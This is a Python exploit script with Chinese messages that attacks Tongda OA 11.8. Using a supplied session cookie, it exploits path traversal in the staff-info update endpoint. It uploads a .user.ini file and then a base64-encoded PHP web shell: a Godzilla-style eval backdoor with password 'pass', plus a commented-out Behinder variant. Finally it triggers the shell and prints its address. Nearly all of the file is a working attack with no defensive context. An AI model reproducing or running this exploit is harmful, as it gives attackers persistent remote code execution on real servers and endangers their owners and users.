import requests
import time
import base64

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'


def Upload_Ini(host): ## 通达11.8上传user.ini文件
    print(CYAN + '[->] 正在检测<V11.8上传.user.ini文件包含漏洞' + END)
    # print(("Cookie格式: USER_NAME_COOKIE=admin; PHPSESSID=xxxxx; OA_USER_ID=admin; SID_1=xxxx"))
    print(("Cookie格式:PHPSESSID=xxxxx"))
    cookie = input(('请输入你的cookie: '))
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = 'general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/.user'
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmluaSIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgphdXRvX3ByZXBlbmRfZmlsZT0xMTExMTEubG9nCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
    try:
        res = requests.post(url=host + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print(GREEN + '[*] 成功上传.user.ini文件!' + END)
            Upload_Log(host, cookie)
        else:
            print(RED + '[-] 上传.user.ini文件失败!\n'+ END)
    except:
        pass

def Upload_Log(target_url,cookie): ## 上传日志文件
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = 'general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/111111'
    data = base64.b64decode('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocApAc2Vzc2lvbl9zdGFydCgpOwpAc2V0X3RpbWVfbGltaXQoMCk7CkBlcnJvcl9yZXBvcnRpbmcoMCk7CmZ1bmN0aW9uIGVuY29kZSgkRCwkSyl7CiAgICBmb3IoJGk9MDskaTxzdHJsZW4oJEQpOyRpKyspIHsKICAgICAgICAkYyA9ICRLWyRpKzEmMTVdOwogICAgICAgICREWyRpXSA9ICREWyRpXV4kYzsKICAgIH0KICAgIHJldHVybiAkRDsKfQokcGFzcz0ncGFzcyc7CiRwYXlsb2FkTmFtZT0ncGF5bG9hZCc7CiRrZXk9JzNjNmUwYjhhOWMxNTIyNGEnOwppZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpewogICAgJGRhdGE9ZW5jb2RlKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyRwYXNzXSksJGtleSk7CiAgICBpZiAoaXNzZXQoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0pKXsKICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7CiAgICAgICAgaWYgKHN0cnBvcygkcGF5bG9hZCwiZ2V0QmFzaWNzSW5mbyIpPT09ZmFsc2UpewogICAgICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJHBheWxvYWQsJGtleSk7CiAgICAgICAgfQoJCWV2YWwoJHBheWxvYWQpOwogICAgICAgIGVjaG8gc3Vic3RyKG1kNSgkcGFzcy4ka2V5KSwwLDE2KTsKICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoZW5jb2RlKEBydW4oJGRhdGEpLCRrZXkpKTsKICAgICAgICBlY2hvIHN1YnN0cihtZDUoJHBhc3MuJGtleSksMTYpOwogICAgfWVsc2V7CiAgICAgICAgaWYgKHN0cnBvcygkZGF0YSwiZ2V0QmFzaWNzSW5mbyIpIT09ZmFsc2UpewogICAgICAgICAgICAkX1NFU1NJT05bJHBheWxvYWROYW1lXT1lbmNvZGUoJGRhdGEsJGtleSk7CiAgICAgICAgfQogICAgfQp9CgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==')
    # data = base64.b64decode(
    #     'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOyBzZXNzaW9uX3N0YXJ0KCk7CiAgICAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKCSRfU0VTU0lPTlsnayddPSRrZXk7CglzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319CiAgICBAY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=')
    try:
        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print(GREEN + '[*] 成功上传log文件!' + END)
            Get_Shell(target_url, cookie)
        else:
            print(RED + '[-] 上传log文件失败!\n' + END)
    except:
        pass

def Get_Shell(target_url,cookie): ## 通达11.8getshell
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Cookie': cookie
    }
    payload = 'general/reportshop/workshop/report/attachment-remark/form.inc.php'
    try:
        res = requests.get(url=target_url + payload, headers=headers, timeout=5)
        if res.status_code == 200:
            # print('[*] 成功上传冰蝎shell, 密码为: rebeyond')
            print(GREEN + '[*] 成功上传哥斯拉shell, 密码为: pass' + END)
            print(GREEN + '[*] Shell地址为: {}'.format(target_url + payload) + END)
            print('')
        else:
            # print('[*]  成功上传冰蝎shell, 密码为: rebyeond')
            print(GREEN + '[*] 成功上传哥斯拉shell, 密码为: pass' + END)
            print(GREEN + '[*] Shell地址为: {}'.format(target_url + payload) + END)
            print(GREEN + '[!] 可能需要等待一会儿即可连接。\n' + END)
    except:
        pass

def run(host):
    Upload_Ini(host)